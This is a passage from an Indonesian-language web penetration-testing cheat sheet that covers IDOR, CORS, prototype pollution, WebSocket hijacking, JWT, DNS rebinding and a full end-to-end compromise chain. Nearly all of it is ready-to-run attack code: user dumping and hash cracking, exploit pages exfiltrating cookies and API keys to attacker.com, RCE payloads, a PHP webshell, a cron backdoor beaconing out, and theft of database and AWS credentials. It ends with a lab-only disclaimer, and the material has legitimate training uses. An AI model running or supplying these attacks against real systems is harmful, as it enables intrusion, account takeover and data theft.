import concurrent.futures

stolen_data = []

def fetch_user(uid):
    r = requests.get(f"https://target.com/api/users/{uid}/profile", headers=headers)
    if r.status_code == 200:
        data = r.json()
        stolen_data.append(data)
        return data
    return None

# Parallel enumeration (10000 users)
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(fetch_user, i): i for i in range(1, 10001)}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"[+] User {result.get('id')}: {result.get('email')} | {result.get('name')}")

print(f"\n[!] Total users dumped: {len(stolen_data)}")

# ===== STEP 3: Extract credentials dari API yang over-expose =====
# Beberapa API return password_hash, security questions, dll
creds = []
for user in stolen_data:
    if 'password_hash' in user or 'email' in user:
        creds.append({
            'email': user.get('email'),
            'hash': user.get('password_hash',''),
            'phone': user.get('phone',''),
            'reset_token': user.get('reset_token','')
        })

# Save untuk cracking
with open('stolen_hashes.txt', 'w') as f:
    for c in creds:
        if c['hash']:
            f.write(f"{c['hash']}\n")
```

```bash
# ===== STEP 4: Crack password hashes =====
# Hashcat
hashcat -m 3200 stolen_hashes.txt /usr/share/wordlists/rockyou.txt  # bcrypt
hashcat -m 1400 stolen_hashes.txt /usr/share/wordlists/rockyou.txt  # SHA256

# ===== STEP 5: Credential stuffing ke service lain =====
# Banyak user pakai password sama di multiple services
# Test ke target yang sama
hydra -C cracked_creds.txt target.com https-post-form \
  "/login:email=^USER^&password=^PASS^:Invalid"
```

## Bukti
- 10000+ user profiles ter-dump via IDOR
- Password hashes ter-crack
- Multiple accounts compromised via credential reuse

---

# 30. CORS → Data Theft → Account Takeover (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A05 + A01  
**Tujuan**: CORS misconfiguration → steal sensitive data → takeover akun

## Full Exploit

```bash
# ===== STEP 1: Confirm CORS misconfiguration =====
curl -s -I -H "Origin: https://attacker.com" https://target.com/api/user/me
# Access-Control-Allow-Origin: https://attacker.com    ← REFLECTED!
# Access-Control-Allow-Credentials: true                ← WITH COOKIES!
```

```html
<!-- ===== STEP 2: Host exploit page di attacker.com ===== -->
<html>
<head><title>Interesting Article</title></head>
<body>
<h1>Loading content...</h1>
<script>
(async function(){
  // Step 3: Steal user profile (termasuk sensitive data)
  let profile = await fetch('https://target.com/api/user/me', {
    credentials: 'include'
  }).then(r => r.json());
  
  // Step 4: Steal API keys
  let apiKeys = await fetch('https://target.com/api/user/api-keys', {
    credentials: 'include'
  }).then(r => r.json()).catch(()=>({}));
  
  // Step 5: Steal sessions/tokens
  let sessions = await fetch('https://target.com/api/user/sessions', {
    credentials: 'include'
  }).then(r => r.json()).catch(()=>({}));
  
  // Step 6: Change email (CSRF via CORS)
  await fetch('https://target.com/api/user/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
  });
  
  // Step 7: Exfiltrate everything
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      profile: profile,
      apiKeys: apiKeys,
      sessions: sessions,
      cookies: document.cookie
    })
  });
  
  // Step 8: Request password reset
  await fetch('https://target.com/api/forgot-password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
  });
})();
</script>
</body>
</html>
```

## Bukti
- CORS me-reflect arbitrary origin + credentials
- Profile, API keys, session data ter-exfiltrate
- Email berubah → password reset → full ATO

---

# 31. Prototype Pollution → XSS / RCE (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A03 + A08  
**Tujuan**: Manipulasi JavaScript prototype → XSS client-side atau RCE server-side

## Full Exploit

```javascript
// ===== CLIENT-SIDE: Prototype Pollution → XSS =====

// STEP 1: Detect prototype pollution via URL
// https://target.com/page?__proto__[test]=polluted
// Atau via JSON merge:
POST /api/settings
{"__proto__": {"polluted": true}}

// STEP 2: Verify pollution
// Di browser console: ({}).polluted === true → Confirmed!

// STEP 3: Exploit ke XSS
// Jika library (jQuery, Lodash, dll) menggunakan polluted property:

// Via URL parameter:
https://target.com/page?__proto__[innerHTML]=<img src=x onerror=alert(1)>
https://target.com/page?__proto__[srcdoc]=<script>alert(1)</script>
https://target.com/page?__proto__[onload]=alert(1)

// Via JSON body merge (lodash.merge, jQuery.extend):
POST /api/settings
{
  "constructor": {
    "prototype": {
      "innerHTML": "<img src=x onerror=alert(document.domain)>",
      "isAdmin": true
    }
  }
}

// Bypass sanitizer via prototype:
POST /api/settings
{"__proto__": {"allowedTags": ["script","img","svg"], "allowedAttributes": {"*": ["onerror","onload"]}}}
```

```javascript
// ===== SERVER-SIDE: Prototype Pollution → RCE (Node.js) =====

// STEP 1: Pollute child_process options
POST /api/merge
{
  "__proto__": {
    "shell": true,
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}

// STEP 2: Pollute env variables untuk RCE
POST /api/merge
{
  "__proto__": {
    "env": {
      "NODE_OPTIONS": "--require /tmp/exploit.js"
    },
    "shell": "/bin/bash",
    "argv0": "bash -c 'id > /tmp/pwned'"
  }
}

// STEP 3: Exploit via child_process.spawn/exec
// Jika app menggunakan child_process setelah pollution:
POST /api/merge
{
  "constructor": {
    "prototype": {
      "shell": "/proc/self/exe",
      "env": {"EVIL": "require('child_process').execSync('id')"},
      "NODE_OPTIONS": "-e eval(process.env.EVIL)"
    }
  }
}
```

```bash
# Tool: Server-Side Prototype Pollution scanner
# pp-finder, ppfuzz
ppmap -url https://target.com/page
```

## Bukti
- `({}).polluted === true` di browser console
- XSS ter-trigger via prototype pollution
- RCE tercapai di server Node.js

---

# 32. WebSocket Hijacking

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Hijack WebSocket connection → read/send messages sebagai korban

## Full Exploit

```bash
# ===== STEP 1: Identifikasi WebSocket endpoint =====
# Di DevTools → Network → WS tab
# ws://target.com/ws/chat
# wss://target.com/ws/notifications

# ===== STEP 2: Cek apakah Origin di-validasi =====
# Gunakan wscat dari domain lain
wscat -c "wss://target.com/ws/chat" -H "Origin: https://attacker.com" -H "Cookie: session=VALID"
# Jika connected → Origin tidak divalidasi!
```

```html
<!-- ===== STEP 3: Cross-Site WebSocket Hijacking (CSWSH) ===== -->
<!-- Host di attacker.com → kirim link ke korban -->
<html>
<body>
<h1>Real-time News Feed</h1>
<div id="output"></div>
<script>
// Connect ke WebSocket target menggunakan cookie korban
var ws = new WebSocket('wss://target.com/ws/chat');

ws.onopen = function() {
  console.log('[+] WebSocket hijacked!');
  
  // Request chat history
  ws.send(JSON.stringify({type: 'get_history', count: 1000}));
  
  // Subscribe ke semua channels
  ws.send(JSON.stringify({type: 'subscribe', channel: 'admin'}));
  ws.send(JSON.stringify({type: 'subscribe', channel: 'internal'}));
};

ws.onmessage = function(e) {
  var data = e.data;
  console.log('[INTERCEPTED] ' + data);
  
  // Exfil semua messages ke attacker
  fetch('https://attacker.com/ws-steal', {
    method: 'POST',
    body: data
  });
  
  // Display untuk stealth
  document.getElementById('output').innerHTML += '<p>' + data + '</p>';
};

// Send malicious message as victim
setTimeout(function(){
  ws.send(JSON.stringify({
    type: 'message',
    to: 'admin',
    content: 'Please reset my password to: hacked123'
  }));
}, 3000);
</script>
</body>
</html>
```

## Bukti
- WebSocket connection dari origin attacker berhasil
- Messages korban ter-intercept
- Berhasil mengirim pesan sebagai korban

---

# 33. JWT Full Attack Chain

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Comprehensive JWT exploitation: none alg → weak secret → key confusion → forge admin token

## Full Exploit

```bash
# ===== STEP 1: Decode JWT (tanpa validasi) =====
# JWT format: HEADER.PAYLOAD.SIGNATURE
echo "eyJhbGci..." | cut -d. -f2 | base64 -d 2>/dev/null
# {"sub":"user123","role":"user","iat":1715000000}
```

```bash
# ===== STEP 2: Algorithm None Attack =====
# Ubah header: {"alg":"none"}
python3 -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','iat':1715000000}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
# Kirim token baru → jika server menerima → VULN!
curl -H "Authorization: Bearer FORGED_TOKEN" https://target.com/api/admin

# ===== STEP 3: Crack Weak Secret =====
# Simpan JWT ke file
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIi..." > jwt.txt

hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
# Secret: password123

python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt
# Secret found: secret

# ===== STEP 4: Forge Admin Token =====
python3 -c "
import jwt
token = jwt.encode(
    {'sub': 'admin', 'role': 'admin', 'is_admin': True, 'iat': 1715000000, 'exp': 9999999999},
    'password123',  # cracked secret
    algorithm='HS256'
)
print(token)
"

# ===== STEP 5: Algorithm Confusion (RS256 → HS256) =====
# Jika server menggunakan RS256, tapi menerima HS256:
# 1. Download public key
curl -s https://target.com/.well-known/jwks.json > jwks.json
# Atau dari certificate:
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > pubkey.pem

# 2. Sign token dengan public key menggunakan HS256
python3 -c "
import jwt
with open('pubkey.pem','r') as f:
    pubkey = f.read()
token = jwt.encode(
    {'sub':'admin','role':'admin'},
    pubkey,
    algorithm='HS256'
)
print(token)
"

# ===== STEP 6: JKU/X5U Header Injection =====
# Buat RSA key pair sendiri
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

python3 -c "
import jwt, json
# Sign dengan key attacker, arahkan jku ke server attacker
token = jwt.encode(
    {'sub':'admin','role':'admin'},
    open('attacker.pem').read(),
    algorithm='RS256',
    headers={'jku':'https://attacker.com/.well-known/jwks.json'}
)
print(token)
"
# Host jwks.json palsu di attacker.com dengan public key attacker
```

```bash
# ===== STEP 7: jwt_tool all-in-one =====
python3 jwt_tool.py TOKEN -X a     # Algorithm none
python3 jwt_tool.py TOKEN -X s     # Spoof JWKS
python3 jwt_tool.py TOKEN -X k     # Key confusion
python3 jwt_tool.py TOKEN -I -pc role -pv admin  # Inject claim
python3 jwt_tool.py TOKEN -T       # Tamper payload
```

## Bukti
- Algorithm none diterima server
- Secret berhasil di-crack
- Admin token berhasil di-forge
- Full admin access via forged JWT

---

# 34. DNS Rebinding → Internal Network Access (Full Chain)

**Kategori**: 🔗 Full Chain | **OWASP**: A10  
**Tujuan**: Bypass same-origin policy via DNS rebinding → akses internal services

## Full Exploit

```python
# ===== STEP 1: Setup DNS rebinding server =====
# DNS server yang merespons dengan IP berbeda setiap request
# Request 1: rebind.attacker.com → ATTACKER_IP (halaman exploit)
# Request 2: rebind.attacker.com → 127.0.0.1 (target internal)

from dnslib.server import DNSServer, DNSHandler, BaseResolver
from dnslib import RR, A, QTYPE
import threading, time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.count = {}
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        reply = request.reply()
        
        if qname not in self.count:
            self.count[qname] = 0
        self.count[qname] += 1
        
        if self.count[qname] <= 2:
            # First requests: point to attacker
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("ATTACKER_IP"), ttl=0))
        else:
            # Subsequent: point to internal target
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        return reply

server = DNSServer(RebindResolver(), port=53, address="0.0.0.0")
server.start_thread()
print("[*] DNS rebinding server running on :53")
```

```html
<!-- ===== STEP 2: Exploit page (hosted di attacker server) ===== -->
<!-- Korban mengakses http://rebind.attacker.com/exploit -->
<html>
<body>
<h1>Loading...</h1>
<script>
// Wait for DNS cache to expire, then rebind to 127.0.0.1
setTimeout(async function(){
  try {
    // Sekarang rebind.attacker.com resolve ke 127.0.0.1
    // Browser thinks it's same origin!
    
    // Access internal admin panel
    let admin = await fetch('http://rebind.attacker.com:8080/admin').then(r=>r.text());
    
    // Access internal API
    let users = await fetch('http://rebind.attacker.com:3000/api/internal/users').then(r=>r.text());
    
    // Access Redis
    let redis = await fetch('http://rebind.attacker.com:6379/').then(r=>r.text()).catch(()=>'');
    
    // Exfil ke attacker
    fetch('https://attacker.com/rebind-result', {
      method: 'POST',
      body: JSON.stringify({admin: admin, users: users, redis: redis})
    });
  } catch(e) {
    console.log('Rebind failed, retrying...');
  }
}, 3000);  // Wait 3s for DNS TTL to expire
</script>
</body>
</html>
```

```bash
# Tool: singularity, rbndr
# Singularity of Origin - automated DNS rebinding
git clone https://github.com/nccgroup/singularity
cd singularity && go build
./singularity -HTTPServerPort 8080 -DNSRebindingStrategy round-robin
```

## Bukti
- DNS rebinding berhasil (domain resolve ke 127.0.0.1)
- Internal admin panel/API diakses dari browser korban
- Data internal ter-exfiltrate ke server attacker

---

# 35. Multi-Vuln Full Pentest Simulation (End-to-End)

**Kategori**: 🔗 Full Chain | **OWASP**: Multiple  
**Tujuan**: Simulasi pentest lengkap dari recon sampai full compromise

## Full Exploit Chain

```
╔══════════════════════════════════════════════════════════════╗
║         FULL PENTEST CHAIN — LAB SIMULATION ONLY            ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Phase 1: RECON                                              ║
║  └→ Subdomain enum → tech fingerprint → endpoint discovery   ║
║                                                              ║
║  Phase 2: INITIAL ACCESS                                     ║
║  └→ SQLi pada search → dump admin hash → crack → login       ║
║                                                              ║
║  Phase 3: PRIVILEGE ESCALATION                               ║
║  └→ IDOR admin API → Mass Assignment → admin role             ║
║                                                              ║
║  Phase 4: PERSISTENCE                                        ║
║  └→ File upload webshell → cron backdoor                     ║
║                                                              ║
║  Phase 5: LATERAL MOVEMENT                                   ║
║  └→ Internal enum → Redis exploit → pivot ke DB server        ║
║                                                              ║
║  Phase 6: DATA EXFILTRATION                                  ║
║  └→ Database dump → S3 credentials → cloud data theft        ║
║                                                              ║
║  Phase 7: IMPACT & REPORTING                                 ║
║  └→ Dokumentasi → remediation → executive summary            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

```bash
# ===== PHASE 1: RECONNAISSANCE =====
# Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -d target.com >> subs.txt
cat subs.txt | httpx -mc 200 -o live.txt

# Technology fingerprinting
whatweb https://target.com
wappalyzer https://target.com
curl -s -I https://target.com | grep -i "server\|x-powered\|x-aspnet"

# Endpoint discovery
katana -u https://target.com -d 3 -o endpoints.txt
gau target.com >> endpoints.txt
cat endpoints.txt | grep -E "\.js$" | xargs -I{} curl -s {} | grep -oP '"/api/[^"]*"' | sort -u

# Parameter discovery
arjun -u https://target.com/search -m GET
paramspider -d target.com

# ===== PHASE 2: INITIAL ACCESS =====
# SQLi found on search parameter
sqlmap -u "https://target.com/search?q=test" --batch --dbs
# → Database: production_db

sqlmap -u "https://target.com/search?q=test" --batch -D production_db -T admins --dump
# admin:$2b$12$LJ3m4ks... → bcrypt hash

# Crack hash
hashcat -m 3200 hash.txt rockyou.txt
# Cracked: admin / Welcome2026!

# Login as admin
curl -X POST https://target.com/api/login \
  -d '{"username":"admin","password":"Welcome2026!"}' \
  -H "Content-Type: application/json" -c cookies.txt

# ===== PHASE 3: PRIVILEGE ESCALATION =====
# Found IDOR: access other admin's data
curl -b cookies.txt https://target.com/api/admin/users/1/api-key
# Response: {"api_key": "sk-live-SUPER_ADMIN_KEY"}

# Mass Assignment: upgrade to super_admin
curl -b cookies.txt -X PATCH https://target.com/api/admin/profile \
  -H "Content-Type: application/json" \
  -d '{"role":"super_admin","permissions":["*"]}'

# ===== PHASE 4: PERSISTENCE =====
# Upload webshell via admin file manager
echo '<?php passthru($_GET["c"]); ?>' > .maintenance.php
curl -b cookies.txt -F "file=@.maintenance.php;type=text/plain" \
  https://target.com/api/admin/upload?path=/var/www/html/

# Verify
curl "https://target.com/.maintenance.php?c=id"
# uid=33(www-data)

# Add cron backdoor
curl "https://target.com/.maintenance.php?c=echo+'*/10+*+*+*+*+curl+http://ATTACKER/beacon'+|+crontab+-"

# ===== PHASE 5: LATERAL MOVEMENT =====
# Enumerate internal network
curl "https://target.com/.maintenance.php?c=cat+/etc/hosts"
# 192.168.1.10 db-server
# 192.168.1.11 cache-server
# 192.168.1.12 internal-api

# Read database credentials from config
curl "https://target.com/.maintenance.php?c=cat+/var/www/html/.env"
# DB_HOST=192.168.1.10
# DB_USER=webapp
# DB_PASS=Pr0d_DB_2026!
# REDIS_HOST=192.168.1.11
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=...

# Access internal Redis
curl "https://target.com/.maintenance.php?c=redis-cli+-h+192.168.1.11+KEYS+%2A"
# session:admin, config:api_keys, cache:users

# ===== PHASE 6: DATA EXFILTRATION =====
# Dump database via webshell
curl "https://target.com/.maintenance.php?c=mysqldump+-h+192.168.1.10+-u+webapp+-pPr0d_DB_2026!+production_db+|+gzip+|+base64" > db_dump_b64.txt

# Use stolen AWS credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
aws s3 ls
aws s3 sync s3://target-backups ./stolen-backups/
aws secretsmanager list-secrets

# ===== PHASE 7: DOCUMENTATION =====
# Generate report with all evidence
```

## Report Template

```markdown
# Penetration Test Report — Target Lab

## Executive Summary
| Metric | Value |
|--------|-------|
| Total Vulnerabilities | 12 |
| Critical | 4 |
| High | 5 |
| Medium | 3 |
| Time to Full Compromise | 4 hours |

## Attack Chain Summary

| Phase | Vulnerability | CVSS | Impact |
|-------|--------------|------|--------|
| Initial Access | SQL Injection (search) | 9.8 | Database dump |
| Priv Escalation | IDOR + Mass Assignment | 8.8 | Super admin |
| Persistence | File Upload (no validation) | 9.1 | Webshell |
| Lateral Movement | Hardcoded credentials in .env | 8.6 | Internal network |
| Data Exfil | AWS keys in config | 9.5 | Cloud compromise |

## Remediation Priority
1. **CRITICAL**: Parameterized queries untuk semua SQL input
2. **CRITICAL**: Remove AWS credentials dari .env, gunakan IAM roles
3. **HIGH**: Implement file upload validation + sandboxing
4. **HIGH**: Fix IDOR — validate object ownership
5. **HIGH**: Remove mass assignment — whitelist allowed fields
6. **MEDIUM**: Segment internal network
7. **MEDIUM**: Encrypt sensitive config values
```

## Bukti
- Full chain dari recon → compromise terdokumentasi
- Setiap phase memiliki screenshot + Burp log
- Database dump + cloud access sebagai bukti impact
- Remediation report lengkap

---

> ⚠️ **DISCLAIMER**: Semua teknik di cheatsheet ini hanya untuk **ethical hacking** di **lab terisolasi** dan **penetration testing yang sudah diotorisasi**. Penggunaan tanpa izin merupakan pelanggaran hukum.
